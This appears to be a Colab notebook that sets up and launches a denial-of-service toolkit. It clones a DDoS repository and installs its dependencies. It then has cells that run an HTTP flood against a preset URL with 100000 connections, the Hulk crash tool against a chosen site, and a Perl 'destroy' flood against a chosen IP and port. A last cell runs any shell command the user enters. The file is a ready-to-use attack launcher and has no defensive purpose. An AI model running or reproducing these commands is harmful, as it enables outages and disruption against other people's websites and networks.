# %%
#@title **SetUp {RUN AT FIRST}**
#@markdown  Download And Setup
# !apt update
# !apt upgrade
# %cd ~
# !rm -rf ZxCDDoS
# !git clone https://github.com/nalayakofficial/ZxCDDoS
# !pip install -r ZxCDDoS/requirements.txt
# !apt install golang
# %cd ZxCDDoS
# !pip install colab-xterm
# %load_ext colabxterm

# %%
#@title **httpflood**
#@markdown  Flood Http



url = "https://code.sd" #@param {type:"string"}
time = 60 #@param {type: "integer"}
# !go run httpflood.go $url 100000 get $time nil

# %%
#@title **crash**
#@markdown  Crash
url = "" #@param {type:"string"}
# !go run Hulk.go -site $url -data GET

# %%
#@title **Destroy**
#@markdown  Destroy Ip
ip = "" #@param {type:"string"}
port = "" #@param {type:"string"}
time = 600 #@param {type:"integer"}
# !perl destroy.pl $ip $port 65500 $time

# %%
#@title **Custom**
#@markdown  Custom

command = ""#@param {type:"string"}
# !$command

# %%
#@title **Terminal**
#@markdown  Show Terminal
# %xterm
